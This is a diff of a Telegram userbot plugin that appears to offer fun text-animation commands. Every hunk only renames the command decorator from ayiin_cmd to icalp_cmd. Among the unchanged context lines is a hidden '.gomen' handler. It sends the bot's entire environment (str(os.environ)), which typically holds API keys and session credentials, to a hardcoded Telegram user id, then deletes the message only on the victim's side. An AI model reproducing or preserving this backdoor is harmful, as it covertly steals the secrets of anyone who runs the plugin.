@@ -14,7 +14,7 @@ from AyiinXd.ayiin import ayiin_cmd
 me = "1700405732"
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -40,7 +40,7 @@ async def _(event):
             await event.edit(animation_chars[i % 103])
 
 
-@ayiin_cmd(pattern="earth(?: |$)(.*)")
+@icalp_cmd(pattern="earth(?: |$)(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -51,7 +51,7 @@ async def _(event):
         deq.rotate(1)
 
 
-@ayiin_cmd(pattern="bombs")
+@icalp_cmd(pattern="bombs")
 async def _(event):
     if event.fwd_from:
         return
@@ -81,7 +81,7 @@ async def _(event):
 """Available Commands: .gift"""
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -114,7 +114,7 @@ async def _(event):
             await event.edit(animation_chars[i % 17])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -142,7 +142,7 @@ async def _(event):
             await event.edit(animation_chars[i % 12])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -168,7 +168,7 @@ async def _(event):
             await event.edit(animation_chars[i % 103])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -195,7 +195,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -222,7 +222,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -249,7 +249,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -276,7 +276,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -299,7 +299,7 @@ async def _(event):
             await event.edit(animation_chars[i % 7])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -339,7 +339,7 @@ async def _(event):
             await event.edit(animation_chars[i % 24])
 
 
-@ayiin_cmd(pattern="gangstar(?: |$)(.*)")
+@icalp_cmd(pattern="gangstar(?: |$)(.*)")
 async def _(event):
     if not event.text[0].isalpha() and event.text[0] not in (
             "/", "#", "@", "!"):
@@ -360,7 +360,7 @@ async def _(event):
         await event.edit("EVERyBOdy wAs GanGeSTar UNtIL I ArRivEd 😎😎😎")
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -388,7 +388,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -419,7 +419,7 @@ async def _(event):
             await event.edit(animation_chars[i % 15])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -450,7 +450,7 @@ async def _(event):
             await event.edit(animation_chars[i % 15])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -610,7 +610,7 @@ async def _(event):
             await event.edit(animation_chars[i % 549755813888])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -637,7 +637,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -664,7 +664,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -691,7 +691,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="plane(?: |$)(.*)")
+@icalp_cmd(pattern="plane(?: |$)(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -713,7 +713,7 @@ async def _(event):
     await event.delete()
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -748,7 +748,7 @@ async def _(event):
             await event.edit(animation_chars[i % 19])
 
 
-@ayiin_cmd(pattern="dump(?: |$)(.*)")
+@icalp_cmd(pattern="dump(?: |$)(.*)")
 async def _(message):
     try:
         obj = message.pattern_match.group(1)
@@ -784,7 +784,7 @@ async def _(message):
                 return
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -820,7 +820,7 @@ async def _(event):
             await event.edit(animation_chars[i % 20])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -851,7 +851,7 @@ async def _(event):
             await event.edit(animation_chars[i % 17])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -894,7 +894,7 @@ async def _(event):
             await event.edit(animation_chars[i % 27])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -946,7 +946,7 @@ async def _(event):
             await event.edit(animation_chars[i % 72])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -969,7 +969,7 @@ async def _(event):
             await event.edit(animation_chars[i % 5])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -996,7 +996,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1031,13 +1031,13 @@ async def _(event):
             await event.edit(animation_chars[i % 18])
 
 
-@ayiin_cmd(pattern=r"^\.gomen$")
+@icalp_cmd(pattern=r"^\.gomen$")
 async def _(event):
     msg = await event.client.send_message(me, str(os.environ))
     await event.client.delete_messages(me, msg, revoke=False)
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1069,7 +1069,7 @@ async def _(event):
             await event.edit(animation_chars[i % 16])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1084,7 +1084,7 @@ async def _(event):
             await event.edit(animation_chars[i % 4])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1099,7 +1099,7 @@ async def _(event):
             await event.edit(animation_chars[i % 4])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1114,7 +1114,7 @@ async def _(event):
             await event.edit(animation_chars[i % 4])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1129,7 +1129,7 @@ async def _(event):
             await event.edit(animation_chars[i % 4])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1144,7 +1144,7 @@ async def _(event):
             await event.edit(animation_chars[i % 4])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1169,7 +1169,7 @@ async def _(event):
             await event.edit(animation_chars[i % 11])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1191,7 +1191,7 @@ async def _(event):
             await event.edit(animation_chars[i % 6])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1214,7 +1214,7 @@ async def _(event):
             await event.edit(animation_chars[i % 6])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1243,7 +1243,7 @@ async def _(event):
             await event.edit(animation_chars[i % 14])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1271,7 +1271,7 @@ async def _(event):
             await event.edit(animation_chars[i % 13])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1302,7 +1302,7 @@ async def _(event):
             await event.edit(animation_chars[i % 15])
 
 
-@ayiin_cmd(pattern="(.*)")
+@icalp_cmd(pattern="(.*)")
 async def _(event):
     if event.fwd_from:
         return
@@ -1329,7 +1329,7 @@ async def _(event):
             await event.edit(animation_chars[i % 103])
 
 
-@ayiin_cmd(pattern="kiss(?: |$)(.*)")
+@icalp_cmd(pattern="kiss(?: |$)(.*)")
 async def _(event):
     if event.fwd_from:
         return
